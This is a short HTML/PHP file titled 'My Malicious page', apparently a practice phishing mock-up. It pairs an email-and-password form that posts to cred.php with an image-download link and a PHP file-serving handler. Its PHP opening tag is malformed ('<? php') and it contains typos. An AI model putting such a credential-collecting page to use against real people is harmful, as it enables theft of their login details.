<!DOCTYPE html>
<html>
<head>
	<title>My Malicious page</title>
</head>
<body>

<form action="cred.php">
	Email:		<input type="email" name="email">
	Password:	<input type="Password" name="password">
	<button>Submit</button>
</form>

<h2>Download Image here</h2>
<a href="index.php?file=pic.jpg">click here</a>


<? php
		
	if(!empty($_GET['file'])){

		$filename = basename($_GET['file']);
		$filepatch = 'image/'.$filename;

		if(!empty($filename) && file_exists($filepatch)){

			//Define Headers
			header("Cache-Control: public");
			header("Content-Description: File Transfer");
			header("Content-Disposition: attachment; filename=$filename");
			header("Content-Type: application/zip");
			header("Content-Transfer-Emcoding: binary");

			readfile($filepatch);
			exit;
		}else{
			echo "No File found";
		}
	}

?>

</body>
</html>